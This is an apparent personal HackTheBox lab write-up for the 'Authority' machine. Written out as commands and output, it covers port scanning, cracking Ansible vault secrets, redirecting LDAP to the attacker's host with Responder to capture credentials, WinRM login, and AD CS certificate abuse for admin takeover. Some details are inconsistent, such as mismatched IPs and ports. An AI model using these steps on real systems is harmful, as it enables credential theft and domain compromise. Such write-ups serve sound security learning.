@@ -1,0 +1,203 @@
+=====================================================================================================
+													******** HTB - machines: Authority ********
+=====================================================================================================
+Firstly I eported the IP as an env variable and ran an 'nmap' port scan on all ports on the target 
+machine.
+
+** export IP=10.10.11.208
+** nmap -n -Pn -p- $IP --open
+
+Nmap scan report for 10.10.11.222
+PORT      STATE SERVICE
+
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+636/tcp   open  ldapssl
+8443/tcp  open  https-alt
+
+Next I will do a service enumeratio and run simple nmap scritos to find out more about the services up
+and running on the host with the below nmap command:
+
+** nmap -n -Pn -p22,80,9000 -sc -sV $IP
+
+Nmap scan report for 10.10.11.222
+PORT     STATE SERVICE       VERSION
+
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-29 19:43:24Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2023-07-29T19:44:31+00:00; +4h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+8443/tcp open  ssl/https-alt
+|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 82
+|     Date: Sat, 29 Jul 2023 19:43:33 GMT
+|     Connection: close
+|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 82
+|     Date: Sat, 29 Jul 2023 19:43:31 GMT
+|     Connection: close
+|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET, HEAD, POST, OPTIONS
+|     Content-Length: 0
+|     Date: Sat, 29 Jul 2023 19:43:32 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 1936
+|     Date: Sat, 29 Jul 2023 19:43:40 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=172.16.2.118
+| Not valid before: 2023-07-27T19:02:22
+|_Not valid after:  2025-07-29T06:40:46
+
+Host script results:
+|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
+| smb2-time: 
+|   date: 2023-07-29T19:44:19
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+
+-- Host Enumeration:
+====================
+OS: Windows OS
+Web server: 
+Web app Technology:
+
+-- Exploitation Walkthrough: 
+============================
+On looking at the web app runnign on the host, i could see that its just a fresh default install and 
+thus notig interesting can be found there.
+
+There was an ldap and a winrm service running on the host. WinRM is used for remote managemnt and ldap 
+is used for authentication.
+
+ldap can be used to get clear-text passwords which we can then use to login with the winrm service.
+
+This is the approach we will follow. But first of, we need can enmerate the smb service running on the
+host to what we have installed on the host.
+
+We use the below command to enum the smb service on the host. We that 'ansible' is running on the host.
+Ansible is used to automate provisioning, config management, app deployment, orchestration, etc.
+
+** smbclient -L \\\\$IP
+** smbclient \\\\$IP\\development
+** cd automation\ansible\pwm\defaults or cd automation\ansible\share\tasks
+** get main.yml
+** cat main.yml
+
+We copy each of the ansible vault AES encryption to a separate file. Each file will start with:
+'$ANSIBLE_VAULT;1.1;AES256' then on another line is '313563383439633230633734353632613...........'
+
+** nano ansfile1.txt
+** nano ansfile2.txt
+** nano ansfile3.txt
+
+Next we convert the ansible vault output to hashes then we use hashcat or john-d-ripper to crack it.
+** ansible2john ansfile1.txt > vault1.txt
+** ansible2john ansfile2.txt > vault2.txt
+** ansible2john ansfile3.txt > vault3.txt
+
+We thne get the clear text password '!@#$%^&*' of the hash gotten from the ansible2john tool.
+
+** john --format=ansible --wordlist=/usr/share/wordlists/rockyou.txt vault1.txt
+** john --format=ansible --wordlist=/usr/share/wordlists/rockyou.txt vault2.txt
+** john --format=ansible --wordlist=/usr/share/wordlists/rockyou.txt vault3.txt
+** john --show vaault1.txt
+** clear text-password is: !@#$%^&*
+
+Next we use this clear text password to decrypt the ansible vault output with 'ansible-vault' as below:
+
+** cat ansfile1.txt | ansible-vault decrypt			=>		svc_pwm
+** cat ansfile2.txt | ansible-vault decrypt			=>		pWm_@dm!N_!23
+** cat ansfile3.txt | ansible-vault decrypt			=>		DevT3st@123
+
+Next we try to use the passwords gotten to log in to the web app in the /private/config/login URL which
+only asks for a password and we get redirected to /private/config/manager URL.
+
+** https://10.10.11.222:8443/pwm/private/config/manager
+** https://10.10.11.222:8443/pwm/private/config/login
+
+We download the config file located at the bottom of the webpage and edit the ldap server url with 
+below and setup responder to capture requsts which will show use rhe clear text password for ldap
+
+**ldap://10.10.14.217:389
+**$sudo responder -I tun0
+
+[+] Listening for events...     
+[LDAP] Cleartext Client   : 10.10.11.222
+[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
+[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP, 
+DC=authority, DC=htb
+[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP, 
+DC=authority, DC=htb
+
+With the ldap password, we can then use winrm tool to remotely logon since port 5986 is open and we get 
+the user.txt flag.
+
+** evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!
+
+To escalate priv to admin, we need to exploit vuln certs on the host to do this we use the certify tool
+located at: https://github.com/GhostPack/Certify compile an drun it on the host.
+
+This hosts show how to exploit AD CS (Active Directory Certificate Services), a new attack vector to AD
+
+Here we get the template, dns, ca, upn, etc values of the toolwe will use to get the certificate on the
+host. Fisrt we add a new computer to the hosr with the below command and run the certipy-ad tool:
+
+** impacket-addcomputer 10.10.11.222/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name icecream$ -computer-pass 'mypassword'
+** sudo apt install certipy-ad
+** certipy-ad req -u icecream$ -p mypassword -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222
+** certipy-ad cert -pfx administrator_authority.pfx -nokey -out user.crt
+** certipy-ad cert -pfx administrator_authority.pfx -nocert -out user.key
+
+The above commands will write the private and certificate keys to a file. Next, we passthecert located
+at: https://github.com/AlmondOffSec/PassTheCert/tree/main/Python to login via the cert created.
+
+** python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass
+
+With the above comand we will login as an admin and get the system flag
+
+Note: because I cannot combile the certify binary, I could not follow along and get the admin flag. The
+tutorial i used can be found at: https://pwnme.in/authority-hackthebox/
+
+See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
+
+
+
